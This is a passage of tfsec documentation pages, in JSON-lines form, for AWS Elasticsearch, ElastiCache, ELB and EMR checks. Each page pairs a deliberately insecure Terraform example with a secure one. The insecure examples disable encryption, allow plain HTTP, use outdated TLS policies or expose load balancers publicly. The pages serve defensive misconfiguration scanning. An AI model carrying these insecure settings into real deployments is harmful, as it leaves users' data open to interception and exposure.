{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/elastic-search/enable-domain-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/elastic-search/enable-domain-encryption/index.md", "content": "---\ntitle: Elasticsearch domain isn't encrypted at rest.\n---\n\n# Elasticsearch domain isn't encrypted at rest.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nYou should ensure your Elasticsearch data is encrypted at rest to help prevent sensitive information from being read by unauthorised users.\n\n### Possible Impact\nData will be readable if compromised\n\n### Suggested Resolution\nEnable ElasticSearch domain encryption\n\n\n### Insecure Example\n\nThe following example will fail the aws-elastic-search-enable-domain-encryption check.\n```terraform\n\n resource \"aws_elasticsearch_domain\" \"bad_example\" {\n   domain_name = \"domain-foo\"\n \n   encrypt_at_rest {\n     enabled = false\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-elastic-search-enable-domain-encryption check.\n```terraform\n\n resource \"aws_elasticsearch_domain\" \"good_example\" {\n   domain_name = \"domain-foo\"\n \n   encrypt_at_rest {\n     enabled = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#encrypt_at_rest](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#encrypt_at_rest){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/encryption-at-rest.html](https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/encryption-at-rest.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:10.478397"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/elastic-search/enable-domain-logging/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/elastic-search/enable-domain-logging/index.md", "content": "---\ntitle: Domain logging should be enabled for Elastic Search domains\n---\n\n# Domain logging should be enabled for Elastic Search domains\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nAmazon ES exposes four Elasticsearch logs through Amazon CloudWatch Logs: error logs, search slow logs, index slow logs, and audit logs. \n\nSearch slow logs, index slow logs, and error logs are useful for troubleshooting performance and stability issues. \n\nAudit logs track user activity for compliance purposes. \n\nAll the logs are disabled by default.\n\n### Possible Impact\nLogging provides vital information about access and usage\n\n### Suggested Resolution\nEnable logging for ElasticSearch domains\n\n\n### Insecure Example\n\nThe following example will fail the aws-elastic-search-enable-domain-logging check.\n```terraform\n\n resource \"aws_elasticsearch_domain\" \"bad_example\" {\n   domain_name           = \"example\"\n   elasticsearch_version = \"1.5\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-elastic-search-enable-domain-logging check.\n```terraform\n\n resource \"aws_elasticsearch_domain\" \"good_example\" {\n   domain_name           = \"example\"\n   elasticsearch_version = \"1.5\"\n \n   log_publishing_options {\n     cloudwatch_log_group_arn = aws_cloudwatch_log_group.example.arn\n     log_type                 = \"AUDIT_LOGS\"\n     enabled                  = true  \n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#log_type](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#log_type){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/es-createdomain-configure-slow-logs.html](https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/es-createdomain-configure-slow-logs.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:10.755956"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/elastic-search/enable-in-transit-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/elastic-search/enable-in-transit-encryption/index.md", "content": "---\ntitle: Elasticsearch domain uses plaintext traffic for node to node communication.\n---\n\n# Elasticsearch domain uses plaintext traffic for node to node communication.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nTraffic flowing between Elasticsearch nodes should be encrypted to ensure sensitive data is kept private.\n\n### Possible Impact\nIn transit data between nodes could be read if intercepted\n\n### Suggested Resolution\nEnable encrypted node to node communication\n\n\n### Insecure Example\n\nThe following example will fail the aws-elastic-search-enable-in-transit-encryption check.\n```terraform\n\n resource \"aws_elasticsearch_domain\" \"bad_example\" {\n   domain_name = \"domain-foo\"\n \n   node_to_node_encryption {\n     enabled = false\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-elastic-search-enable-in-transit-encryption check.\n```terraform\n\n resource \"aws_elasticsearch_domain\" \"good_example\" {\n   domain_name = \"domain-foo\"\n \n   node_to_node_encryption {\n     enabled = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#encrypt_at_rest](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#encrypt_at_rest){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/ntn.html](https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/ntn.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:11.032020"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/elastic-search/enforce-https/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/elastic-search/enforce-https/index.md", "content": "---\ntitle: Elasticsearch doesn't enforce HTTPS traffic.\n---\n\n# Elasticsearch doesn't enforce HTTPS traffic.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nPlain HTTP is unencrypted and human-readable. This means that if a malicious actor was to eavesdrop on your connection, they would be able to see all of your data flowing back and forth.\n\nYou should use HTTPS, which is HTTP over an encrypted (TLS) connection, meaning eavesdroppers cannot read your traffic.\n\n### Possible Impact\nHTTP traffic can be intercepted and the contents read\n\n### Suggested Resolution\nEnforce the use of HTTPS for ElasticSearch\n\n\n### Insecure Example\n\nThe following example will fail the aws-elastic-search-enforce-https check.\n```terraform\n\n resource \"aws_elasticsearch_domain\" \"bad_example\" {\n   domain_name = \"domain-foo\"\n \n   domain_endpoint_options {\n     enforce_https = false\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-elastic-search-enforce-https check.\n```terraform\n\n resource \"aws_elasticsearch_domain\" \"good_example\" {\n   domain_name = \"domain-foo\"\n \n   domain_endpoint_options {\n     enforce_https = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#enforce_https](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#enforce_https){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/es-data-protection.html](https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/es-data-protection.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:11.298047"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/elastic-search/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/elastic-search/index.md", "content": "---\ntitle: elastic-search\n---\n\n# elastic-search\n\n## Checks\n\n\n- [enable-domain-encryption](enable-domain-encryption) Elasticsearch domain isn't encrypted at rest.\n\n- [enable-domain-logging](enable-domain-logging) Domain logging should be enabled for Elastic Search domains\n\n- [enable-in-transit-encryption](enable-in-transit-encryption) Elasticsearch domain uses plaintext traffic for node to node communication.\n\n- [enforce-https](enforce-https) Elasticsearch doesn't enforce HTTPS traffic.\n\n- [use-secure-tls-policy](use-secure-tls-policy) Elasticsearch domain endpoint is using outdated TLS policy.\n\n\n\n", "timestamp": "2025-10-24T22:24:11.531332"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/elastic-search/use-secure-tls-policy/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/elastic-search/use-secure-tls-policy/index.md", "content": "---\ntitle: Elasticsearch domain endpoint is using outdated TLS policy.\n---\n\n# Elasticsearch domain endpoint is using outdated TLS policy.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nYou should not use outdated/insecure TLS versions for encryption. You should be using TLS v1.2+.\n\n### Possible Impact\nOutdated SSL policies increase exposure to known vulnerabilities\n\n### Suggested Resolution\nUse the most modern TLS/SSL policies available\n\n\n### Insecure Example\n\nThe following example will fail the aws-elastic-search-use-secure-tls-policy check.\n```terraform\n\n resource \"aws_elasticsearch_domain\" \"bad_example\" {\n   domain_name = \"domain-foo\"\n \n   domain_endpoint_options {\n     enforce_https = true\n     tls_security_policy = \"Policy-Min-TLS-1-0-2019-07\"\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-elastic-search-use-secure-tls-policy check.\n```terraform\n\n resource \"aws_elasticsearch_domain\" \"good_example\" {\n   domain_name = \"domain-foo\"\n \n   domain_endpoint_options {\n     enforce_https = true\n     tls_security_policy = \"Policy-Min-TLS-1-2-2019-07\"\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#tls_security_policy](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#tls_security_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/es-data-protection.html](https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/es-data-protection.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:11.819622"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/elasticache/add-description-for-security-group/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/elasticache/add-description-for-security-group/index.md", "content": "---\ntitle: Missing description for security group/security group rule.\n---\n\n# Missing description for security group/security group rule.\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nSecurity groups and security group rules should include a description for auditing purposes.\n\nSimplifies auditing, debugging, and managing security groups.\n\n### Possible Impact\nDescriptions provide context for the firewall rule reasons\n\n### Suggested Resolution\nAdd descriptions for all security groups and rules\n\n\n### Insecure Example\n\nThe following example will fail the aws-elasticache-add-description-for-security-group check.\n```terraform\n\nresource \"aws_security_group\" \"bar\" {\n\tname = \"security-group\"\n}\n\nresource \"aws_elasticache_security_group\" \"bad_example\" {\n\tname = \"elasticache-security-group\"\n\tsecurity_group_names = [aws_security_group.bar.name]\n\tdescription = \"\"\n}\n\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-elasticache-add-description-for-security-group check.\n```terraform\n\nresource \"aws_security_group\" \"bar\" {\n\tname = \"security-group\"\n}\n\nresource \"aws_elasticache_security_group\" \"good_example\" {\n\tname = \"elasticache-security-group\"\n\tsecurity_group_names = [aws_security_group.bar.name]\n\tdescription = \"something\"\n}\n\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_security_group#description](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_security_group#description){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonElastiCache/latest/mem-ug/SecurityGroups.Creating.html](https://docs.aws.amazon.com/AmazonElastiCache/latest/mem-ug/SecurityGroups.Creating.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:12.285620"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/elasticache/enable-at-rest-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/elasticache/enable-at-rest-encryption/index.md", "content": "---\ntitle: Elasticache Replication Group stores unencrypted data at-rest.\n---\n\n# Elasticache Replication Group stores unencrypted data at-rest.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nData stored within an Elasticache replication node should be encrypted to ensure sensitive data is kept private.\n\n### Possible Impact\nAt-rest data in the Replication Group could be compromised if accessed.\n\n### Suggested Resolution\nEnable at-rest encryption for replication group\n\n\n### Insecure Example\n\nThe following example will fail the aws-elasticache-enable-at-rest-encryption check.\n```terraform\n\n resource \"aws_elasticache_replication_group\" \"bad_example\" {\n         replication_group_id = \"foo\"\n         replication_group_description = \"my foo cluster\"\n \n         at_rest_encryption_enabled = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-elasticache-enable-at-rest-encryption check.\n```terraform\n\n resource \"aws_elasticache_replication_group\" \"good_example\" {\n         replication_group_id = \"foo\"\n         replication_group_description = \"my foo cluster\"\n \n         at_rest_encryption_enabled = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_replication_group#at_rest_encryption_enabled](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_replication_group#at_rest_encryption_enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonElastiCache/latest/red-ug/at-rest-encryption.html](https://docs.aws.amazon.com/AmazonElastiCache/latest/red-ug/at-rest-encryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:12.587790"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/elasticache/enable-backup-retention/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/elasticache/enable-backup-retention/index.md", "content": "---\ntitle: Redis cluster should have backup retention turned on\n---\n\n# Redis cluster should have backup retention turned on\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nRedis clusters should have a snapshot retention time to ensure that they are backed up and can be restored if required.\n\n### Possible Impact\nWithout backups of the redis cluster recovery is made difficult\n\n### Suggested Resolution\nConfigure snapshot retention for redis cluster\n\n\n### Insecure Example\n\nThe following example will fail the aws-elasticache-enable-backup-retention check.\n```terraform\n\n resource \"aws_elasticache_cluster\" \"bad_example\" {\n \tcluster_id           = \"cluster-example\"\n \tengine               = \"redis\"\n \tnode_type            = \"cache.m4.large\"\n \tnum_cache_nodes      = 1\n \tparameter_group_name = \"default.redis3.2\"\n \tengine_version       = \"3.2.10\"\n \tport                 = 6379\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-elasticache-enable-backup-retention check.\n```terraform\n\n resource \"aws_elasticache_cluster\" \"good_example\" {\n \tcluster_id           = \"cluster-example\"\n \tengine               = \"redis\"\n \tnode_type            = \"cache.m4.large\"\n \tnum_cache_nodes      = 1\n \tparameter_group_name = \"default.redis3.2\"\n \tengine_version       = \"3.2.10\"\n \tport                 = 6379\n \n \tsnapshot_retention_limit = 5\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_cluster#snapshot_retention_limit](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_cluster#snapshot_retention_limit){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonElastiCache/latest/red-ug/backups-automatic.html](https://docs.aws.amazon.com/AmazonElastiCache/latest/red-ug/backups-automatic.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:12.893053"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/elasticache/enable-in-transit-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/elasticache/enable-in-transit-encryption/index.md", "content": "---\ntitle: Elasticache Replication Group uses unencrypted traffic.\n---\n\n# Elasticache Replication Group uses unencrypted traffic.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nTraffic flowing between Elasticache replication nodes should be encrypted to ensure sensitive data is kept private.\n\n### Possible Impact\nIn transit data in the Replication Group could be read if intercepted\n\n### Suggested Resolution\nEnable in transit encryption for replication group\n\n\n### Insecure Example\n\nThe following example will fail the aws-elasticache-enable-in-transit-encryption check.\n```terraform\n\n resource \"aws_elasticache_replication_group\" \"bad_example\" {\n         replication_group_id = \"foo\"\n         replication_group_description = \"my foo cluster\"\n         transit_encryption_enabled = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-elasticache-enable-in-transit-encryption check.\n```terraform\n\n resource \"aws_elasticache_replication_group\" \"good_example\" {\n         replication_group_id = \"foo\"\n         replication_group_description = \"my foo cluster\"\n         transit_encryption_enabled = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_replication_group#transit_encryption_enabled](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_replication_group#transit_encryption_enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonElastiCache/latest/red-ug/in-transit-encryption.html](https://docs.aws.amazon.com/AmazonElastiCache/latest/red-ug/in-transit-encryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:13.148622"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/elasticache/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/elasticache/index.md", "content": "---\ntitle: elasticache\n---\n\n# elasticache\n\n## Checks\n\n\n- [add-description-for-security-group](add-description-for-security-group) Missing description for security group/security group rule.\n\n- [enable-at-rest-encryption](enable-at-rest-encryption) Elasticache Replication Group stores unencrypted data at-rest.\n\n- [enable-backup-retention](enable-backup-retention) Redis cluster should have backup retention turned on\n\n- [enable-in-transit-encryption](enable-in-transit-encryption) Elasticache Replication Group uses unencrypted traffic.\n\n\n\n", "timestamp": "2025-10-24T22:24:13.261413"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/elb/alb-not-public/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/elb/alb-not-public/index.md", "content": "---\ntitle: Load balancer is exposed to the internet.\n---\n\n# Load balancer is exposed to the internet.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nThere are many scenarios in which you would want to expose a load balancer to the wider internet, but this check exists as a warning to prevent accidental exposure of internal assets. You should ensure that this resource should be exposed publicly.\n\n### Possible Impact\nThe load balancer is exposed on the internet\n\n### Suggested Resolution\nSwitch to an internal load balancer or add a tfsec ignore\n\n\n### Insecure Example\n\nThe following example will fail the aws-elb-alb-not-public check.\n```terraform\n\n resource \"aws_alb\" \"bad_example\" {\n \tinternal = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-elb-alb-not-public check.\n```terraform\n\n resource \"aws_alb\" \"good_example\" {\n \tinternal = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:13.726276"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/elb/drop-invalid-headers/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/elb/drop-invalid-headers/index.md", "content": "---\ntitle: Load balancers should drop invalid headers\n---\n\n# Load balancers should drop invalid headers\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nPassing unknown or invalid headers through to the target poses a potential risk of compromise. \n\nBy setting drop_invalid_header_fields to true, anything that does not conform to well known, defined headers will be removed by the load balancer.\n\n### Possible Impact\nInvalid headers being passed through to the target of the load balance may exploit vulnerabilities\n\n### Suggested Resolution\nSet drop_invalid_header_fields to true\n\n\n### Insecure Example\n\nThe following example will fail the aws-elb-drop-invalid-headers check.\n```terraform\n\n resource \"aws_alb\" \"bad_example\" {\n \tname               = \"bad_alb\"\n \tinternal           = false\n \tload_balancer_type = \"application\"\n \t\n \taccess_logs {\n \t  bucket  = aws_s3_bucket.lb_logs.bucket\n \t  prefix  = \"test-lb\"\n \t  enabled = true\n \t}\n   \n \tdrop_invalid_header_fields = false\n   }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-elb-drop-invalid-headers check.\n```terraform\n\n resource \"aws_alb\" \"good_example\" {\n \tname               = \"good_alb\"\n \tinternal           = false\n \tload_balancer_type = \"application\"\n \t\n \taccess_logs {\n \t  bucket  = aws_s3_bucket.lb_logs.bucket\n \t  prefix  = \"test-lb\"\n \t  enabled = true\n \t}\n   \n \tdrop_invalid_header_fields = true\n   }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb#drop_invalid_header_fields](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb#drop_invalid_header_fields){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/elasticloadbalancing/latest/application/application-load-balancers.html](https://docs.aws.amazon.com/elasticloadbalancing/latest/application/application-load-balancers.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:14.001079"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/elb/http-not-used/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/elb/http-not-used/index.md", "content": "---\ntitle: Use of plain HTTP.\n---\n\n# Use of plain HTTP.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nPlain HTTP is unencrypted and human-readable. This means that if a malicious actor was to eavesdrop on your connection, they would be able to see all of your data flowing back and forth.\n\nYou should use HTTPS, which is HTTP over an encrypted (TLS) connection, meaning eavesdroppers cannot read your traffic.\n\n### Possible Impact\nYour traffic is not protected\n\n### Suggested Resolution\nSwitch to HTTPS to benefit from TLS security features\n\n\n### Insecure Example\n\nThe following example will fail the aws-elb-http-not-used check.\n```terraform\n\n resource \"aws_alb_listener\" \"bad_example\" {\n \tprotocol = \"HTTP\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-elb-http-not-used check.\n```terraform\n\n resource \"aws_alb_listener\" \"good_example\" {\n \tprotocol = \"HTTPS\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb_listener](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb_listener){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://www.cloudflare.com/en-gb/learning/ssl/why-is-http-not-secure/](https://www.cloudflare.com/en-gb/learning/ssl/why-is-http-not-secure/){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:14.268474"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/elb/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/elb/index.md", "content": "---\ntitle: elb\n---\n\n# elb\n\n## Checks\n\n\n- [alb-not-public](alb-not-public) Load balancer is exposed to the internet.\n\n- [drop-invalid-headers](drop-invalid-headers) Load balancers should drop invalid headers\n\n- [http-not-used](http-not-used) Use of plain HTTP.\n\n- [use-secure-tls-policy](use-secure-tls-policy) An outdated SSL policy is in use by a load balancer.\n\n\n\n", "timestamp": "2025-10-24T22:24:14.416397"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/elb/use-secure-tls-policy/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/elb/use-secure-tls-policy/index.md", "content": "---\ntitle: An outdated SSL policy is in use by a load balancer.\n---\n\n# An outdated SSL policy is in use by a load balancer.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nYou should not use outdated/insecure TLS versions for encryption. You should be using TLS v1.2+.\n\n### Possible Impact\nThe SSL policy is outdated and has known vulnerabilities\n\n### Suggested Resolution\nUse a more recent TLS/SSL policy for the load balancer\n\n\n### Insecure Example\n\nThe following example will fail the aws-elb-use-secure-tls-policy check.\n```terraform\n\n resource \"aws_alb_listener\" \"bad_example\" {\n \tssl_policy = \"ELBSecurityPolicy-TLS-1-1-2017-01\"\n \tprotocol = \"HTTPS\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-elb-use-secure-tls-policy check.\n```terraform\n\n resource \"aws_alb_listener\" \"good_example\" {\n \tssl_policy = \"ELBSecurityPolicy-TLS-1-2-2017-01\"\n \tprotocol = \"HTTPS\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb_listener](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb_listener){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:14.697146"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/emr/enable-at-rest-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/emr/enable-at-rest-encryption/index.md", "content": "---\ntitle: Enable at-rest encryption for EMR clusters.\n---\n\n# Enable at-rest encryption for EMR clusters.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nData stored within an EMR cluster should be encrypted to ensure sensitive data is kept private.\n\n### Possible Impact\nAt-rest data in the EMR cluster could be compromised if accessed.\n\n### Suggested Resolution\nEnable at-rest encryption for EMR cluster\n\n\n### Insecure Example\n\nThe following example will fail the aws-emr-enable-at-rest-encryption check.\n```terraform\n\n  resource \"aws_emr_security_configuration\" \"bad_example\" {\n    name = \"emrsc_other\"\n    \n    configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": false,\n      \"EnableAtRestEncryption\": false\n    }\n  }\n  EOF\n  }\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-emr-enable-at-rest-encryption check.\n```terraform\n\n  resource \"aws_emr_security_configuration\" \"good_example\" {\n    name = \"emrsc_other\"\n  \n    configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": true,\n      \"EnableAtRestEncryption\": true\n    }\n  }\n  EOF\n  }\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/config/latest/developerguide/operational-best-practices-for-nist_800-171.html](https://docs.aws.amazon.com/config/latest/developerguide/operational-best-practices-for-nist_800-171.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:15.172561"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/emr/enable-in-transit-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/emr/enable-in-transit-encryption/index.md", "content": "---\ntitle: Enable in-transit encryption for EMR clusters.\n---\n\n# Enable in-transit encryption for EMR clusters.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nData stored within an EMR cluster should be encrypted to ensure sensitive data is kept private.\n\n### Possible Impact\nIn-transit data in the EMR cluster could be compromised if accessed.\n\n### Suggested Resolution\nEnable in-transit encryption for EMR cluster\n\n\n### Insecure Example\n\nThe following example will fail the aws-emr-enable-in-transit-encryption check.\n```terraform\n\n  resource \"aws_emr_security_configuration\" \"bad_example\" {\n    name = \"emrsc_other\"\n    \n    configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": false,\n      \"EnableAtRestEncryption\": false\n    }\n  }\n  EOF\n  }\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-emr-enable-in-transit-encryption check.\n```terraform\n\n  resource \"aws_emr_security_configuration\" 